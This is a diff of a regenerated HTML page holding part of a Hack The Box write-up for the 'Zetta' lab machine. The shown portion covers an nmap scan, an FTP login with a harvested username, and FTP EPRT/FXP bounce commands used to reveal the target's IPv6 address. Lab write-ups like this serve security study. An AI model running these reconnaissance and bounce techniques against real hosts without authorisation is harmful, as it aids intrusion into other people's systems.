@@ -4,14 +4,12 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
-        <title>Zetta - s1ck g33k</title><meta name="Description" content="Here I will explain my path for Zetta box from Hack The Box."><meta property="og:title" content="Zetta" />
+        <title>Zetta - gr4n173</title><meta name="Description" content="Here I will explain my path for Zetta box from Hack The Box."><meta property="og:title" content="Zetta" />
 <meta property="og:description" content="Here I will explain my path for Zetta box from Hack The Box." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://example.com/zetta/" />
-<meta property="og:image" content="http://example.com/zetta/featured-image.png"/>
+<meta property="og:url" content="http://example.com/zetta/" /><meta property="og:image" content="http://example.com/zetta/featured-image.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-02-22T20:29:01+08:00" />
-<meta property="article:modified_time" content="2020-02-25T08:45:01+08:00" />
+<meta property="article:modified_time" content="2020-02-25T08:45:01+08:00" /><meta property="og:site_name" content="My cool site" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="http://example.com/zetta/featured-image.png"/>
 <meta name="twitter:title" content="Zetta"/>
@@ -19,7 +17,9 @@
 <meta name="application-name" content="gr4n173">
 <meta name="apple-mobile-web-app-title" content="gr4n173"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/zetta/" /><link rel="prev" href="http://example.com/ldap/" /><link rel="next" href="http://example.com/scavenger/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/zetta/" /><link rel="prev" href="http://example.com/moee-1/" /><link rel="next" href="http://example.com/scavenger/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -33,7 +33,7 @@
                             "url": "http:\/\/example.com\/zetta\/featured-image.png",
                             "width":  585 ,
                             "height":  370 
-                        }],"genre": "posts","keywords": "linux, htb, ftp, postgres, rsync, ipv6, sqli, rce","wordcount":  2649 ,
+                        }],"genre": "posts","keywords": "linux, htb, ftp, postgres, rsync, ipv6, sqli, rce","wordcount":  2631 ,
         "url": "http:\/\/example.com\/zetta\/","datePublished": "2020-02-22T20:29:01+08:00","dateModified": "2020-02-25T08:45:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -47,88 +47,35 @@
             },"description": "Here I will explain my path for Zetta box from Hack The Box."
     }
     </script></head>
-    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-164630777-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-164630777-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-	<div class="header-wrapper">
+    <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="s1ck g33k"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
+            <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
         </div>
         <div class="menu">
             <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/moee/"> Project </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                         <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
-                            <i class="fas fa-search fa-fw"></i>
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                         </a>
                         <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
-                            <i class="fas fa-times-circle fa-fw"></i>
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                         </span>
                     </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fas fa-adjust fa-fw"></i>
-                </a>
-            </div>
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
         </div>
     </div>
 </header><header class="mobile" id="header-mobile">
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-164630777-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-164630777-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-	<div class="header-container">
+    <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="s1ck g33k"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
+                <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
@@ -138,37 +85,35 @@ if (!doNotTrack) {
                     <div class="search mobile" id="search-mobile">
                         <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                         <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
-                            <i class="fas fa-search fa-fw"></i>
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                         </a>
                         <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
-                            <i class="fas fa-times-circle fa-fw"></i>
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                         </span>
                     </div>
                     <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                         Cancel
                     </a>
                 </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/moee/" title="">Project</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw"></i>
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
             </a></div>
     </div>
-</header>
-<div class="search-dropdown desktop">
-    <div id="search-dropdown-desktop"></div>
-</div>
-<div class="search-dropdown mobile">
-    <div id="search-dropdown-mobile"></div>
-</div>
-<main class="main">
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animated flipInX">Zetta</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://gr4n173.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw"></i>Hack The Box</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-02-22">2020-02-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2649 words&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Zetta</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://gr4n173.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Hack The Box</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-02-22">2020-02-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2631 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -176,10 +121,10 @@ if (!doNotTrack) {
         data-srcset="/zetta/featured-image.png, /zetta/featured-image.png 1.5x, /zetta/featured-image.png 2x"
         data-sizes="auto"
         alt="/zetta/featured-image.png"
-        title="Here I will explain my path for Zetta box from Hack The Box." /></div><div class="details toc" id="toc-static"  kept="">
+        title="Here I will explain my path for Zetta box from Hack The Box." /></div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
-                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
@@ -214,10 +159,10 @@ if (!doNotTrack) {
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="public/images/description_box.png"
-            data-srcset="/zetta/public/images/description_box.png, public/images/description_box.png 1.5x, /zetta/public/images/description_box.png 2x"
+            data-src="/zetta/public/images/description_box.png"
+            data-srcset="/zetta/public/images/description_box.png, /zetta/public/images/description_box.png 1.5x, /zetta/public/images/description_box.png 2x"
             data-sizes="auto"
-            alt="/zetta/public/images/description_box.png" />
+            alt="/zetta/public/images/description_box.png" width="585" height="370" />
     </a><figcaption class="image-caption">Description of the box</figcaption>
     </figure></p>
 <p>In above picture it&rsquo;s ip is <code>10.10.10.156</code>, I added it to <code>/etc/hosts</code> as <code>zetta.htb</code>. Let&rsquo;s solve this box.</p>
@@ -226,7 +171,7 @@ if (!doNotTrack) {
 <p>Let&rsquo;s start with our universal port scanner <code>nmap</code> to see the open port and service which shows FTP(TCP 21),SSH(TCP 22) and HTTP(TCP 80).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -244,29 +189,27 @@ if (!doNotTrack) {
 </span><span class="lnt">16
 </span><span class="lnt">17
 </span><span class="lnt">18
-</span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">root@gr4n173:~$ nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156
-Nmap 7.80 scan initiated Sat Jan <span class="m">25</span> 22:29:29 <span class="m">2020</span> as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156
-Nmap scan report <span class="k">for</span> zetta.htb <span class="o">(</span>10.10.10.156<span class="o">)</span>
-Host is up <span class="o">(</span>0.29s latency<span class="o">)</span>.
-Not shown: <span class="m">997</span> filtered ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     Pure-FTPd
-22/tcp open  ssh     OpenSSH 7.9p1 Debian <span class="m">10</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp open  http    nginx
-<span class="p">|</span>_http-title: Ze::a Share
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span> at Sat Jan <span class="m">25</span> 22:30:28 <span class="m">2020</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 59.55 seconds
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gr4n173:~$ nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156
+</span></span><span class="line"><span class="cl">Nmap 7.80 scan initiated Sat Jan <span class="m">25</span> 22:29:29 <span class="m">2020</span> as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> zetta.htb <span class="o">(</span>10.10.10.156<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.29s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> filtered ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     Pure-FTPd
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.9p1 Debian <span class="m">10</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Ze::a Share
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span> at Sat Jan <span class="m">25</span> 22:30:28 <span class="m">2020</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 59.55 seconds
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="web-enumeration">Web Enumeration</h3>
 <p><strong><em>zetta.htb</em></strong></p>
@@ -275,10 +218,10 @@ Nmap <span class="k">done</span> at Sat Jan <span class="m">25</span> 22:30:28 <
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="public/images/front_page.jpg"
-            data-srcset="/zetta/public/images/front_page.jpg, public/images/front_page.jpg 1.5x, /zetta/public/images/front_page.jpg 2x"
+            data-src="/zetta/public/images/front_page.jpg"
+            data-srcset="/zetta/public/images/front_page.jpg, /zetta/public/images/front_page.jpg 1.5x, /zetta/public/images/front_page.jpg 2x"
             data-sizes="auto"
-            alt="/zetta/public/images/front_page.jpg" />
+            alt="/zetta/public/images/front_page.jpg" width="1366" height="643" />
     </a><figcaption class="image-caption">Front Page</figcaption>
     </figure></p>
 <p>Then, I searched every part of this website and found something interesting things in</p>
@@ -292,7 +235,7 @@ Native FTP We support native FTP with FXP enabled. We also support RFC2428.</p>
 <p>With this detail I m into the <code>FTP</code> server now as.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -310,48 +253,44 @@ Native FTP We support native FTP with FXP enabled. We also support RFC2428.</p>
 </span><span class="lnt">16
 </span><span class="lnt">17
 </span><span class="lnt">18
-</span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ftp zetta.htb
-Connected to zetta.htb.
-220---------- Welcome to Pure-FTPd <span class="o">[</span>privsep<span class="o">]</span> <span class="o">[</span>TLS<span class="o">]</span> ----------
-220-You are user number <span class="m">1</span> of <span class="m">500</span> allowed.
-220-Local <span class="nb">time</span> is now 08:23. Server port: 21.
-220-This is a private system - No anonymous login
-220-IPv6 connections are also welcome on this server.
-<span class="m">220</span> You will be disconnected after <span class="m">15</span> minutes of inactivity.
-Name <span class="o">(</span>zetta.htb:bikram<span class="o">)</span>: b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP
-<span class="m">331</span> User b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP OK. Password required
-Password:
-230-This server supports FXP transfers
-230-OK. Current restricted directory is 
-230-0 files used <span class="o">(</span>0%<span class="o">)</span> - authorized: <span class="m">10</span> files
-<span class="m">230</span> <span class="m">0</span> Kbytes used <span class="o">(</span>0%<span class="o">)</span> - authorized: <span class="m">1024</span> Kb
-Remote system <span class="nb">type</span> is UNIX.
-Using binary mode to transfer files.
-ftp&gt; 
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@gr4n173:~$ ftp zetta.htb
+</span></span><span class="line"><span class="cl">Connected to zetta.htb.
+</span></span><span class="line"><span class="cl">220---------- Welcome to Pure-FTPd <span class="o">[</span>privsep<span class="o">]</span> <span class="o">[</span>TLS<span class="o">]</span> ----------
+</span></span><span class="line"><span class="cl">220-You are user number <span class="m">1</span> of <span class="m">500</span> allowed.
+</span></span><span class="line"><span class="cl">220-Local <span class="nb">time</span> is now 08:23. Server port: 21.
+</span></span><span class="line"><span class="cl">220-This is a private system - No anonymous login
+</span></span><span class="line"><span class="cl">220-IPv6 connections are also welcome on this server.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> You will be disconnected after <span class="m">15</span> minutes of inactivity.
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>zetta.htb:bikram<span class="o">)</span>: b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP
+</span></span><span class="line"><span class="cl"><span class="m">331</span> User b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP OK. Password required
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">230-This server supports FXP transfers
+</span></span><span class="line"><span class="cl">230-OK. Current restricted directory is 
+</span></span><span class="line"><span class="cl">230-0 files used <span class="o">(</span>0%<span class="o">)</span> - authorized: <span class="m">10</span> files
+</span></span><span class="line"><span class="cl"><span class="m">230</span> <span class="m">0</span> Kbytes used <span class="o">(</span>0%<span class="o">)</span> - authorized: <span class="m">1024</span> Kb
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; 
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p>here you can see <code>FXP transfers</code> supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this <a href="https://tools.ietf.org/html/rfc2428" target="_blank" rel="noopener noreffer">RFC2428</a>.</p>
+</div><p>here you can see <code>FXP transfers</code> supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this <a href="https://tools.ietf.org/html/rfc2428" target="_blank" rel="noopener noreffer ">RFC2428</a>.</p>
 <p>At first I had set tcpdump listner as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~<span class="nv">$tcpdump</span> -lni tun0 -vvvvvvvv ip6
-tcpdump: listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, capture size <span class="m">262144</span> bytes
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@gr4n173:~<span class="nv">$tcpdump</span> -lni tun0 -vvvvvvvv ip6
+</span></span><span class="line"><span class="cl">tcpdump: listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, capture size <span class="m">262144</span> bytes
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Now using this commands:-</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -368,66 +307,62 @@ tcpdump: listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span cl
 </span><span class="lnt">15
 </span><span class="lnt">16
 </span><span class="lnt">17
-</span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; quote EPRT |1|10.10.10.156|2222|
-200-FXP transfer: from 10.10.16.25 to 10.10.10.156
-200 PORT command successful
-ftp&gt; quote EPRT |2|2001:41d0:52:a00::e66|2222|
-200-FXP transfer: from 10.10.10.156 to 2001:41d0:52:a00::e66%176
-200 PORT command successful
-ftp&gt; quote EPRT |1|10.10.10.156|2222|
-200-FXP transfer: from 2001:41d0:52:a00::e66%176 to 10.10.10.156
-200 PORT command successful
-ftp&gt; quote EPRT |2|dead:beef:2::11df|2222|
-200-FXP transfer: from 10.10.10.156 to dead:beef:2::11df%160
-200 PORT command successful
-ftp&gt; LIST
-?Invalid command
-ftp&gt; quote LIST
-425 Could not open data connection to port 2222: Connection refused
-ftp&gt;
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ftp&gt; quote EPRT |1|10.10.10.156|2222|
+</span></span><span class="line"><span class="cl">200-FXP transfer: from 10.10.16.25 to 10.10.10.156
+</span></span><span class="line"><span class="cl">200 PORT command successful
+</span></span><span class="line"><span class="cl">ftp&gt; quote EPRT |2|2001:41d0:52:a00::e66|2222|
+</span></span><span class="line"><span class="cl">200-FXP transfer: from 10.10.10.156 to 2001:41d0:52:a00::e66%176
+</span></span><span class="line"><span class="cl">200 PORT command successful
+</span></span><span class="line"><span class="cl">ftp&gt; quote EPRT |1|10.10.10.156|2222|
+</span></span><span class="line"><span class="cl">200-FXP transfer: from 2001:41d0:52:a00::e66%176 to 10.10.10.156
+</span></span><span class="line"><span class="cl">200 PORT command successful
+</span></span><span class="line"><span class="cl">ftp&gt; quote EPRT |2|dead:beef:2::11df|2222|
+</span></span><span class="line"><span class="cl">200-FXP transfer: from 10.10.10.156 to dead:beef:2::11df%160
+</span></span><span class="line"><span class="cl">200 PORT command successful
+</span></span><span class="line"><span class="cl">ftp&gt; LIST
+</span></span><span class="line"><span class="cl">?Invalid command
+</span></span><span class="line"><span class="cl">ftp&gt; quote LIST
+</span></span><span class="line"><span class="cl">425 Could not open data connection to port 2222: Connection refused
+</span></span><span class="line"><span class="cl">ftp&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>from first command</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">quote EPRT <span class="p">|</span>1<span class="p">|</span>10.10.10.156<span class="p">|</span>2222<span class="p">|</span>
-quote EPRT <span class="p">|</span>2<span class="p">|</span>2001:41d0:52:a00::e66<span class="p">|</span>2222<span class="p">|</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">quote EPRT <span class="p">|</span>1<span class="p">|</span>10.10.10.156<span class="p">|</span>2222<span class="p">|</span>
+</span></span><span class="line"><span class="cl">quote EPRT <span class="p">|</span>2<span class="p">|</span>2001:41d0:52:a00::e66<span class="p">|</span>2222<span class="p">|</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>this specifies server should use IPV4 to open a data connection to host of zetta.htb on port 2222 and similar for second command IP6 . Now in third command IPV4 is activated again and IPV6 of my own ip which I got from <code>ifconfig</code> is used.</p>
 <p>This was I got IPV6 as <em><strong>dead:beef::250:56ff:febd:a9a4</strong></em></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
-</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ tcpdump -lni tun0 -vvvvvvvv ip6
-tcpdump: listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, capture size <span class="m">262144</span> bytes
